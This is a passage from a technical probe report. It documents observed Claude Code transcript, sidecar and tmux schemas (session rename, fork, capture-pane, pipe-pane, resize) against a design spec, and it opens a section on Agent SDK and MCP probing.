{"parentUuid":"b159063b-eff0-4bd5-8610-742116ceb184","isSidechain":false,"attachment":{"type":"queued_command","prompt":"Reply with only the word SECOND","source_uuid":"2891166f-e7ff-439e-aced-2766a1597762","commandMode":"prompt","origin":{"kind":"human"},"timestamp":"2026-09-14T15:51:41.227Z"},"type":"attachment","uuid":"69b673dc-a637-4197-a121-7f23f81536da","timestamp":"2026-09-14T15:51:41.227Z","rendered":[{"content":"<system-reminder>\nThe user sent a new message while you were working:\nReply with only the wor...
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `type` | string | always | `queue-operation` | |
| `operation` | string | always | `enqueue`, `remove` | |
| `reason` | string | sometimes (remove only) | `absorbed_mid_turn` | |
| `content` | string | always | the queued text | |
| `timestamp`, `sessionId` | string | always | | |
| `attachment.type` | string | always | `queued_command` | on an `attachment` entry |
| `attachment.origin.kind` | string | always | `human` | tmux send-keys is recorded as a human |
| `attachment.commandMode` | string | always | `prompt` | |
| `rendered[].content` | string | always | `<system-reminder>\nThe user sent a new message while you were working:...` | what the model saw |

**Variants and edge cases:**
- `enqueue` at 15:51:41.227, `remove` at 15:51:50.854. The removal happened right after the running `sleep 12` tool result.

**Spec alignment:** the spec does not describe these entries. They are the transcript-side evidence that a write landed mid-turn. Not a mismatch; a gap.

---

### Session title: /rename and --name (custom-title, agent-name, session_title, pane_title)

- **Produced by:** Claude Code 2.1.270. `/rename <title>` typed into the TUI over tmux; `claude --name <title>` at spawn; headless `claude --resume <id> -p "/rename <title>"`
- **Consumed by:** §7.1 lines 700–736, D29 (line 134), `EngineCapabilities.can_set_title` (line 496), `EngineAdapter.set_title` (line 438), §18 line 2331; M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` step 8, `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`, `docs/probes/2026-09-14-schemas/tmux-tui/probe_headless_parity.py` h4. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/10-rename-transcript-new-lines.jsonl`)
```json
{"type":"custom-title","customTitle":"shp-probe-title-1","sessionId":"71757dd1-5375-4801-b467-7898a0bc1194"}
{"type":"agent-name","agentName":"shp-probe-title-1","sessionId":"71757dd1-5375-4801-b467-7898a0bc1194"}
{"parentUuid":"4c115cc5-2455-480a-9a0c-86a87cbc0ba7","isSidechain":false,"type":"system","subtype":"local_command","content":"<command-name>/rename</command-name>\n            <command-message>rename</command-message>\n            <command-args>shp-probe-title...
{"parentUuid":"9a05eea3-487d-4abe-a667-ffccc136d174","isSidechain":false,"promptId":"bc5cfd55-024b-4810-8d8d-a6588ce30be9","type":"user","message":{"role":"user","content":"<system-reminder>\nThe user named this session \"shp-probe-title-1\". This may indicate the session's focus or intent.\n</syste...
```
Visible to tmux and the sidecar (`10-rename-before-fmt.txt`, `10-rename-after-fmt.txt`, `10-rename-hooks.txt`, `10-sidecar-after-rename.json`):
```text
pane_title=✳ PONG response
pane_title=✳ shp-probe-title-1
hook events during /rename: []
...,"name":"shp-probe-title-1","nameSource":"user","nameSince":1789401166976,"s...
```
The same done headless (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/h4-transcript-custom-title-lines.jsonl`):
```json
{"type":"custom-title","customTitle":"shp-headless-title","sessionId":"55b21a24-e35c-4121-b504-1c3d12a75d3e"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `custom-title.customTitle` | string | always on rename | `shp-probe-title-1` | written by Claude Code itself |
| `agent-name.agentName` | string | always on rename | same | |
| `system/local_command` | entry pair | always on rename | `<command-name>/rename</command-name>...`, `<local-command-stdout>Session renamed to: ...` | |
| `user` `isMeta:true` | entry | always on rename | `The user named this session "..."` | the model is told about the name |
| `ai-title.aiTitle` | string | sometimes | `PONG response` | engine title, written after the first turn |
| hook `session_title` | string | sometimes | on later `SessionStart` (compact, fork, `--name` startup) and `UserPromptSubmit` | **no hook fires at rename time** |
| `#{pane_title}` | string | always | `<redacted: host name>` (before TUI) → `✳ Claude Code` → `✳ PONG response` (engine title) → `✳ shp-probe-title-1` (user title) | readable with tmux alone |
| sidecar `name` / `nameSource` | string | always while alive | `shp-tui-a-4tvrx00n-00`/`derived` → `shp-probe-title-1`/`user` | `--name` at spawn gives `nameSource: user` |

**Variants and edge cases:**
- Once a user title exists, `pane_title` did not revert to the engine title (a second `ai-title` entry was appended later, and `pane_title` stayed `✳ shp-probe-title-1` in `13-list-sessions-after-exit.txt`).
- A fork inherits the user title: transcript `custom-title` and sidecar `nameSource: user`. Two sessions then share one title, and `/exit` suggests `claude --resume "shp-probe-title-1"`, which is ambiguous (`13-dead-pane.txt`).
- Headless `/rename` on a resumed session worked (`h4_rename.stdout.json` result `Session renamed to: shp-headless-title`). It emitted `SessionStart{resume}` and `SessionEnd{other}`. Not verified: doing this against a session that is live in another process (the attached case).

**Spec alignment:**
- Spec lines 724–731 give the candidate mechanism as "appending an `ai-title` entry to the session transcript", and `can_set_title` is `False` "until the probe in §18 says otherwise". In reality the engine itself writes `custom-title` (not `ai-title`) when `/rename` is typed over the pty, or when spawned with `--name`, so Shepherd never writes the file. For **owned** sessions `can_set_title` can be `True`. `title_synced_at` can be set from the `custom-title` entry, the sidecar `nameSource:"user"`, or `#{pane_title}` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/10-*`, `docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/02-sessionstart-and-sidecar.txt`).
- Spec line 713–715 (`engine` title from `ai-title`): aligned (`07-10-11-transcript-excerpt.jsonl`).
- Spec line 2331: answered as above.

---

### Session sidecar file ~/.claude/sessions/<pid>.json

- **Produced by:** Claude Code 2.1.270, interactive, one file per live process, removed at exit
- **Consumed by:** not in spec. Relevant to §8 `state` (lines 933–945), §9 LocalRunner `probe()`, §7.1 title; M1 (attached discovery), M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` (sidecar snapshots at each step). Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14 (throwaway sessions only; the user's own sidecars were not read)

**Real example** (full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/06-sidecar-permission.json`)
```json
{"pid":4041880,"sessionId":"71757dd1-5375-4801-b467-7898a0bc1194","cwd":"/tmp/shp-tui-A-4tvrx00n","startedAt":1789401012996,"procStart":"543824210","version":"2.1.270","peerProtocol":1,"peerFeatures":["notify_idle","reply_across_default_dirs","artifact_yield"],"kind":"interactive","entrypoint":"cli","pidDomain":"linux:<redacted: machine-id>:pid:[4026531836]","tmux":"probe_a:@0.%0","messagingSocketPath":"/tmp/cc-socks/4041880.sock","name":"shp-tui-a-4tvrx00n-00","nameSource":"derived","nameSince":1789401012996,"status":"waiting","updatedAt":1789401085541,"statusUpdatedAt":1789401085541,"waitingFor":"permission prompt"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `pid` | int | always | equals tmux `#{pane_pid}` | |
| `sessionId` | string | always | | |
| `cwd` | string | always | | |
| `startedAt`, `nameSince`, `updatedAt`, `statusUpdatedAt` | int (epoch ms) | always | | |
| `procStart` | string | always | | |
| `version` | string | always | `2.1.270` | |
| `peerProtocol` | int | always | `1` | |
| `peerFeatures` | array | always | `["notify_idle","reply_across_default_dirs","artifact_yield"]` | |
| `kind` | string | always | `interactive` | |
| `entrypoint` | string | always | `cli` | |
| `pidDomain` | string | always | `linux:<hex>:pid:[<ns>]` | the hex equals this host's `/etc/machine-id` (checked by the auditor); treat as a host identifier |
| `tmux` | string | always (in tmux) | `probe_a:@0.%0`, `probe_fork:@2.%2` | `session:@window.%pane` as the engine sees it |
| `messagingSocketPath` | string | always | `/tmp/cc-socks/<pid>.sock` | |
| `name` / `nameSource` | string | always | `derived`, `user` | |
| `status` | string | always | `idle`, `busy`, `waiting` | |
| `waitingFor` | string | sometimes | `permission prompt` | only with `waiting` |
| `bridgeSessionId` | string | never observed (in cited captures) | | the prober reports it appeared with Remote Control on in a discarded, uncited exploratory run; not verified by any capture here |

**Variants and edge cases:**
- Absent during the trust dialog (`01-trust-dialog-sidecar.json`). Removed after `/exit` (`13-fork-sidecar-after-exit.json`) and after `kill-session` (`15-pid-after-kill.txt`).
- `busy` during a running tool (`07-sidecar-running.json`). `idle` again after `Stop` (`03-sidecar-after-stop.json`).
- `status` stayed `idle` across the 60 s `idle_prompt` notification (`04-sidecar-idle.json`).
- **`waiting` both enters and exits, so the sidecar carries a `needs_you` *clearing* signal** — added 2026-09-16, verified from the captures already in this run. One pid (4041880), one sessionId (`71757dd1-…`), three consecutive files:

  | capture | `status` | `waitingFor` | `statusUpdatedAt` |
  |---|---|---|---|
  | `04-sidecar-idle.json` | `idle` | absent | 1789401017992 |
  | `06-sidecar-permission.json` | `waiting` | `"permission prompt"` | 1789401085541 |
  | `07-sidecar-running.json` | `busy` | cleared to null | 1789401094735 |

  The `waiting → busy` transition is **9.194 s** after the entry. This matters because no *hook* event marks a `PermissionRequest` as resolved — it carries no `tool_use_id`, a TUI Esc rejection emits nothing, and a `-p` auto-refusal shows only in `PostToolBatch` (§PermissionRequest). The sidecar is therefore the only observed source for the exit from a permission-blocked state, not merely for its entry. Previously this section recorded only the entry (`:2322`) and the unrelated `idle`-after-`Stop` transition, so a reader would have concluded no clearing signal existed anywhere.

**Spec alignment:** a gap. The spec does not know this file. It is an engine-owned, non-hook source of `idle/busy/waiting` and the title, which could back `Runner.probe()` and attached-session discovery. Reading it does not conflict with principle 4 (read-only).

---

### tmux list-sessions -F pane state (remain-on-exit on)

- **Produced by:** tmux 3.4 (`tmux -L shepherd-probe list-sessions -F ...`) with `set-option -w remain-on-exit on`
- **Consumed by:** §9 LocalRunner (D14) `probe()`, `exit_code` (§7 line 693), `crashed` rule line 964; M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` steps 1b, 11–13. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/14-list-sessions-after-sigterm.txt`)
```text
# format: #{session_name}|#{pane_pid}|#{pane_dead}|#{pane_dead_status}|#{pane_dead_signal}|#{alternate_on}|#{pane_width}x#{pane_height}|#{pane_title}
# rc=0 stderr=
probe_a|4041880|0|||1|160x45|✳ shp-probe-title-1
probe_b|4041912|1|1||0|160x45|
probe_fork|4042432|1|0||0|160x45|
probe_sig|4042531|1|143||0|160x45|
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `#{session_name}` | string | always | `probe_a`, `probe_b`, `probe_fork`, `probe_sig` | |
| `#{pane_pid}` | int | always | the claude pid (tmux runs the command via exec) | equals the sidecar `pid` and the hook `_claude_pid` |
| `#{pane_dead}` | 0/1 | always | `0` alive, `1` exited | |
| `#{pane_dead_status}` | int | sometimes (dead only) | `0` (/exit), `1` (trust refused), `143` (SIGTERM) | empty while alive |
| `#{pane_dead_signal}` | int | never observed | empty even after SIGTERM | claude handled the signal and exited 143 |
| `#{alternate_on}` | 0/1 | always | `1` live TUI; `0` trust dialog or dead pane | |
| `#{pane_width}x#{pane_height}` | string | always | `160x45` | |
| `#{pane_title}` | string | always | `✳ shp-probe-title-1`, empty on a dead pane | |

**Variants and edge cases:**
- `kill-session` removes the row entirely (`15-list-sessions-after-kill.txt`), so no exit status survives. Record the kill before issuing it.
- On a dead pane, `capture-pane` shows tmux's own line `Pane is dead (status 0, Mon Sep 14 15:53:21 2026)` (`13-dead-pane.txt`).
- The `=<name>:` target form worked for every pane command. Names without `:` were accepted unchanged.
- The socket directory on this host holds sockets named `default`, `shepherd`, `shepherd-probe`, `shepherd-spike`, `shp-schemas-fork`, `shp-schemas-tx`, `shp-spike-9bc1f3` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/tmux-socket-names.txt`).

**Spec alignment:**
- Spec line 1135 puts owned sessions on `tmux -L shepherd`. A socket named `shepherd` already exists on this host (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/tmux-socket-names.txt`, names only). The capture does not show what runs on it. At audit time a read-only `ps` showed a live `tmux -L shepherd new-session -d -s main ...` server owned by the user, not by any probe. So Shepherd's socket name collides with an existing server and should be configuration.
- Spec line 964: `crashed` = "process exit ≠ 0 with no preceding `Stop`/`StopFailure`". The SIGTERM'd session was never prompted, emitted no `Stop`, and exited 143, so it matches `crashed` unless `killed` (line 965, action log) is checked first. A refused trust dialog exits 1 with no hook at all and also matches `crashed`, although nothing crashed: the session was blocked on a dialog (`14-list-sessions-after-sigterm.txt`, `01b-list-sessions-after-refuse.txt`, `hooks-a.jsonl` lines 35–36).

---

### tmux capture-pane output (-p, -e, -S -2000) for the Claude Code TUI

- **Produced by:** tmux 3.4 `capture-pane` over the Claude Code 2.1.270 TUI
- **Consumed by:** §9 Terminal fidelity (lines 1140, 1147–1160), `Runner.snapshot()` (line 426), D14; M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`, `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/04-scrollback-stats.txt` and `04-capture-S2000.txt`)
```text
format '#{alternate_on} #{history_size} #{history_limit} #{pane_height}' -> 1 0 2000 30
capture -S -2000 lines=30 visible lines=30
'1' present in -S -2000 capture: False; '80' present: True
ESC count in -e capture: 12
```
First lines of `capture-pane -p -S -2000` after an 80-line answer in a 30-row pane (`docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/04-capture-S2000.txt`):
```text
  58
  59
  60
...
```
`-e` output keeps SGR colours and OSC 8 hyperlinks (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/01-trust-dialog.ansi.cat-v.txt` line 12):
```text
 ^[[38;5;246m^[]8;id=zaxmda;https://code.claude.com/docs/en/security^[\Security guide^[[39m^[]8;;^[\
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| visible screen | text | always | exactly `pane_height` lines | |
| scrollback (`-S -2000`) on the alternate screen | text | never observed | `history_size` 0; the capture = the 30 visible lines | earlier output is gone from tmux |
| SGR sequences | bytes | always with `-e` | `38;5;N`, `48;5;N`, `1`, `2`, `0`, `39`, `49` | |
| OSC 8 hyperlink | bytes | sometimes | `ESC]8;id=...;https://code.claude.com/docs/en/security ESC\` | |
| input-box line | text | always | `❯` + NBSP + text, between two `────` rules | the NBSP (`M-BM- `) follows `❯` |
| border title | text | sometimes | `──── shp-probe-title-1 ─` on the upper rule after rename | `10-rename-after.txt` |

**Variants and edge cases:**
- Claude Code prints `tmux detected · scroll with PgUp/PgDn · or add 'set -g mouse on' to ~/.tmux.conf for wheel scroll`. That line appears in `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/03-after-stop.txt` line 41 and `12-fork-started.txt` line 41. The TUI keeps its own scroll, which tmux cannot see.
- The TUI redraws the conversation on the alternate screen, so late attach shows the recent part of the conversation, not the start.

**Spec alignment:**
- Spec line 1140 says `capture-pane -e -p -S -2000` "returns the current screen **with ANSI intact** plus scrollback". The ANSI part is aligned. There is **no scrollback** while the TUI is on the alternate screen (`history_size` 0), so a late-attaching client gets only the visible rows. Earlier output must come from the transcript or from a server-side log of `pipe-pane` (`docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/04-scrollback-stats.txt`).
- Spec line 1142 (alternate screen): aligned (`alternate_on=1`, `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/02-after-trust-fmt.txt`).

---

### tmux pipe-pane live byte stream

- **Produced by:** tmux 3.4 `pipe-pane -o "cat >> file"` over the Claude Code 2.1.270 TUI
- **Consumed by:** §9 Terminal fidelity "live byte stream" (line 1152), `Runner.attach()` (line 425); M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/03-pipe-pane.raw`, rendered through `cat -v` in `03-pipe-pane-head.cat-v.txt`)
```text
^[[?25l^[[H^M^[[2C^[[27BPrint^[[9Gthe^[[13Gintegers^[[22Gfrom^[[27G1^[[29Gto^[[32G80,^[[36Gone^[[40Gper^[[44Gline,^[[50Gnothing^[[58Gelse.^M^[[18C^[[2B^[[K^[[30;1H^[[28;63H^[[?25h^[[?25l^[[H^M^[[8B^[[48;5;237m^[[38;5;239mM-bM-^]M-/ ^[[38;5;231mPrint the integers from 1 to 80, one per line, nothing else.^[[39m                                                          ^M^[[16B^[[49m^[[38;5;174mM-bM-^\M-;^[[3GLo^[[38;5;2...
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| cursor hide/show | CSI | always | `ESC[?25l` … `ESC[?25h` around every frame | |
| absolute/relative moves | CSI | always | `ESC[H`, `ESC[nB`, `ESC[nC`, `ESC[nG`, `ESC[r;cH` | a diff-render, not a line stream |
| colours | SGR | always | `38;5;N`, `48;5;N` | |
| size | bytes | always | 4839 bytes for one short turn | `04-scrollback-stats.txt` |

**Variants and edge cases:** the stream is only meaningful to a terminal emulator (xterm.js). Text cannot be grepped out of it, because words are placed by cursor moves (`Print^[[9Gthe^[[13Gintegers`).

**Spec alignment:** aligned with lines 1149–1152 (snapshot, then live bytes, then xterm.js).

---

### tmux resize-window reflow

- **Produced by:** tmux 3.4 `resize-window -t =probe_a: -x 70 -y 30` over the Claude Code 2.1.270 TUI
- **Consumed by:** §9 line 1142, `Runner.resize()` (line 428), D14; M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` step 7. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/09-resize-after-70x30.txt`, stats `09-resize-fmt.txt`)
```text
pane=70x30 window=70x30
max captured line length=70 lines=30
❯ Use the Bash tool to run exactly: sleep 12 ; then reply with only
  DONE-ONE

  Ran 1 shell command

❯ Reply with only the word SECOND

● SECOND

✻ Brewed for 19s · done 3:51 PM

──────────────────────────────────────────────────────────────────────
❯ 
──────────────────────────────────────────────────────────────────────
  ⏸ manual mode on · ? for shortcuts · ← for agents
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| pane/window size | `WxH` | always | `70x30` after resize | |
| max captured line length | int | always | `70` | no line exceeds the width |
| wrapped prompt | text | sometimes | `...reply with only` / `  DONE-ONE` | the TUI re-wraps with a 2-space indent |
| rules | text | always | `────` redrawn at 70 columns | |

**Variants and edge cases:** resizing back to 160x45 restored the layout (the following steps captured normally).

**Spec alignment:** aligned with line 1142 and D14.

---

### ask() via fork: claude --resume <id> --fork-session in a second tmux session

- **Produced by:** Claude Code 2.1.270, interactive, `claude --resume <id> --fork-session` in pane `probe_fork` while the original ran idle in `probe_a`
- **Consumed by:** §9 `ask()` lines 1197–1216, D13 (line 116), `can_fork` (line 495), §7 `origin=ask_fork` / `ephemeral` (lines 657–659), §18 line 2326; M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` step 10 + `docs/probes/2026-09-14-schemas/tmux-tui/analyze_fork.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/12-fork-summary.json`)
```json
{
 "original_session_id": "71757dd1-5375-4801-b467-7898a0bc1194",
 "fork_session_id": "c3f63742-5ff5-44ea-8f6e-a26d027b51d0",
 "original_transcript": "/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl",
 "fork_transcript": "/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/c3f63742-5ff5-44ea-8f6e-a26d027b51d0.jsonl",
 "before": {
  "sha": "481298ac7988e6a063d6c5b22b2ac2f6452286a0e94dcfe9c9c5ec7c46650872",
  "lines": 85,
  "files": [
   "71757dd1-5375-4801-b467-7898a0bc1194",
   "71757dd1-5375-4801-b467-7898a0bc1194.jsonl",
   "memory"
  ]
 },
 "fork_started_no_prompt": {
  "fork_transcript_exists_before_prompt": false,
  "files": [
   "71757dd1-5375-4801-b467-7898a0bc1194",
   "71757dd1-5375-4801-b467-7898a0bc1194.jsonl",
   "memory"
  ]
 },
 "after_fork_turn": {
  "sha": "481298ac7988e6a063d6c5b22b2ac2f6452286a0e94dcfe9c9c5ec7c46650872",
  "lines": 85,
  "files": [
   "71757dd1-5375-4801-b467-7898a0bc1194",
   "71757dd1-5375-4801-b467-7898a0bc1194.jsonl",
   "c3f63742-5ff5-44ea-8f6e-a26d027b51d0.jsonl",
   "memory"
  ]
 },
 "original_unchanged": true,
 ...
 "hook_events_for_original_session_during_fork": []
}
```
Fork transcript structure (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/12-fork-structure.txt`) and the fork's first lines (`12-fork-transcript-head3.jsonl`):
```text
...
fork entries whose uuid also exists in original: 16 of 29
...
original compact_boundary line indexes: [76]
fork compact_boundary line indexes: [7]
...
fork entries carrying both keys -> (type, subtype, session_id is original?, sessionId is fork?): {('user', None, True, True): 4, ('assistant', None, True, True): 2, ('system', 'stop_hook_summary', True, True): 1, ('attachment', None, True, True): 4, ('attachment', None, False, True): 5, ('assistant', None, False, True): 2, ('system', 'stop_hook_summary', False, True): 1}
original entries with session_id key: 34 all equal to original id: True
```
```json
{"type":"custom-title","customTitle":"shp-probe-title-1","sessionId":"c3f63742-5ff5-44ea-8f6e-a26d027b51d0"}
{"type":"ai-title","aiTitle":"PONG response","sessionId":"c3f63742-5ff5-44ea-8f6e-a26d027b51d0"}
{"type":"agent-name","agentName":"shp-probe-title-1","sessionId":"c3f63742-5ff5-44ea-8f6e-a26d027b51d0"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| fork `session_id` | uuid | always | new (`c3f63742-...`) | in `SessionStart{source:fork}` at launch |
| fork transcript file | path | sometimes | **absent until the first prompt**, then `<projdir>/<fork id>.jsonl` | |
| original transcript | file | always | sha256 unchanged, 85 lines before and after the fork turn | `original_unchanged: true` |
| hooks for the original during the fork | list | never observed | `[]` | the target was not touched |
| copied entries `sessionId` | string | always | rewritten to the fork id | |
| copied entries `session_id` | string | sometimes | still the **original** id on copied entries (11 lines) | the only parent link found; no `forkedFrom` key |
| copied range | entries | always | from the original's last `compact_boundary` onward | pre-compact history is not carried |
| title | string | sometimes | inherits the user title (`custom-title`, sidecar `nameSource:user`) | |

**Variants and edge cases:**
- The fork answered from post-compact context only (`12-fork-answer.txt`).
- `/exit` in the fork left its transcript on disk. `--no-session-persistence` "only works with --print" per `claude --help` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/claude-help-excerpt.txt`), so discarding the fork means deleting the file or using `-p`.
- The original's transcript was 85 lines both before and after the fork turn. It was 87 lines when `docs/probes/2026-09-14-schemas/tmux-tui/analyze_fork.py` ran after teardown; those 2 lines were appended after the fork measurement, and which step appended them was not isolated.
- Headless `--resume <id> --fork-session -p` produced the same `SessionStart{fork}` shape (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/event-sequence.txt`).

**Spec alignment:**
- Spec line 1204–1205 (`start_reason` includes `fork`): the field is `source` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` line 30).
- Spec line 1203 says "discard the fork". A TUI fork persists a transcript (and inherits the user title, so it shows up in `/resume` under the same name). Discarding it is an explicit cleanup step (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/12-fork-summary.json` `after_fork_turn.files`; the fork transcript was still present, 53 lines, when `12-fork-structure.txt` was computed after teardown). The spec does not say how "discard" is done, so this is a gap, not a contradiction. The fork carries only the post-compact history, but that is also all the target's own live context holds.
- Spec line 1207 says "the target is never interrupted, its context is never polluted": aligned. The original sha256 was unchanged and no hooks fired for it.
- Spec line 2326 (verify fork path in M3): answered. `can_fork = True` for Claude Code.

<!-- Rendered by build_section.py from SECTION.tmpl.md. Every fenced example is pulled from a capture
     file under docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/ and checked byte-for-byte against
     it before trimming; trims are marked "...". Do not hand-edit SECTION.md; edit the template and rebuild.
     AUDIT 2026-09-14: this file was then edited directly by the auditor (build_section.py / SECTION.tmpl.md were NOT
     updated, so a rebuild would undo these edits): (1) JSON excerpts re-rendered so every omitted key run or list run
     carries a "..." marker at the position it was cut, and kept keys are in capture order (every "..."-delimited
     fragment is now a byte substring of its source capture line); (2) two computed count blocks moved out of fences
     into prose; (3) Status lines for ResultMessage and interrupt() lowered to "partially verified"; (4) spec-alignment
     bullets that are omissions rather than contradictions relabelled as gaps. -->

## Claude Agent SDK (the master, M4) and MCP (the tier-2 tool surface, M4): schemas observed 2026-09-14

**Surface:** `agent-sdk-mcp`. **Source:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/SECTION.md`. Paths that do not start with `docs/` or `/` are relative to `docs/probes/2026-09-14-schemas/agent-sdk-mcp/` (or to the capture folder named in the same caption).

**Scope.** `claude-agent-sdk` 0.2.152 (Python, installed with pip into a throwaway venv under `/tmp`)
driving the Claude Code CLI it bundles (**2.1.259**), plus one control run of the same configuration
against the `claude` on PATH (**2.1.270**). The tier-2 binding was probed with a stdlib-only stdio MCP server
mounted into a headless `claude -p` (2.1.270) with `--mcp-config`. Linux 6.8. Every run used
`claude-haiku-4-5-20251001` and a timeout. Every run records `claude --version`: `meta.json` → `claude_version`
for the SDK runs, `meta.txt` → `claude_version` for the stdio run, and `_claude_version` on every hook line.

**How the evidence was made.**

| Probe | What it does | Output |
|---|---|---|
| `docs/probes/2026-09-14-schemas/agent-sdk-mcp/introspect_sdk.py` | imports the installed package and dumps `inspect.signature` / `dataclasses.fields` / `inspect.getsource` of `ClaudeAgentOptions`, the message and content-block types, `tool`, `create_sdk_mcp_server`, `SdkMcpTool`, and the `ClaudeSDKClient` methods | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/` |
| `master_probe.py <scenario>` | one minimal master per scenario. It patches the SDK transport class to log every JSON object on the CLI's stdout (`_dir:"in"`) and every line the SDK writes to its stdin (`_dir:"out"`). It also logs the parsed SDK objects, what each in-process tool handler received and returned, what `can_use_tool` received and returned, and the Python hook inputs | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/<scenario>/raw-stream.jsonl`, `messages.jsonl`, `handler-calls.jsonl`, `can-use-tool.jsonl`, `hooks.jsonl`, `meta.json` |
| `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh` + `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/mcp_logger_server.py` + `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/capture_hook.sh` | tier-2 binding. The server logs every JSON-RPC line it reads or writes, verbatim. Hooks for PreToolUse, PostToolUse, PostToolUseFailure, PermissionRequest and PermissionDenied are declared in `<tmpdir>/work/.claude/settings.json` and append the raw stdin, the event name, a UTC timestamp and the `/proc` parent chain | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/` |
| `docs/probes/2026-09-14-schemas/agent-sdk-mcp/redact_captures.py` | privacy pass. The CLI's `initialize` response carries `account.email`/`account.organization`, and the transcripts carry an injected `userEmail` line. Both are replaced by `<redacted>` in every capture file | in place |
| `docs/probes/2026-09-14-schemas/agent-sdk-mcp/summarize.py` | field-presence matrix over all 486 captured CLI stdout objects | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/_field-matrix.txt` |
| `docs/probes/2026-09-14-schemas/agent-sdk-mcp/build_section.py` | renders this file from `docs/probes/2026-09-14-schemas/agent-sdk-mcp/SECTION.tmpl.md` | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/SECTION.md` |

Re-run everything (about 6 minutes): `bash docs/probes/2026-09-14-schemas/agent-sdk-mcp/run_all.sh`

**Scenarios** (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/master_probe.py`). Unless noted, each uses the §11 option block literally:
`setting_sources=[]`, `disallowed_tools=["Agent","Task"]`, `allowed_tools=[mcp__shepherd__…]`,
`mcp_servers={"shepherd": create_sdk_mcp_server(...)}`, `can_use_tool=<probe authorize>`, `cwd=None`.
The process cwd is a throwaway dir.
`basic` = spec block as written · `tools_empty` = + `tools=[]` · `locked` = + `tools=[]` + `strict_mcp_config=True`
(also `locked-syscli`, which uses the PATH claude 2.1.270) · `deny` · `slow_approval` · `interrupt` ·
`interrupt_pending_approval` · `resume` (resume + fork) · `resume_other_cwd` · `isolation` (a project `CLAUDE.md` marker under three `setting_sources` values).
The in-process server `shepherd` declares `fleet_summary`, `spawn_session`, `kill_session` (left out of `allowed_tools`, so it goes through `can_use_tool`),
`fail_tool` (returns `is_error`) and `raise_tool` (raises).

**Safety record.** `~/.claude/settings.json` had the same sha256 before and after every run:

```text
375e53220773a12f0a2a7a666740f7fb20d31b2989b250e4076957d026b5d6ac  /root/.claude/settings.json
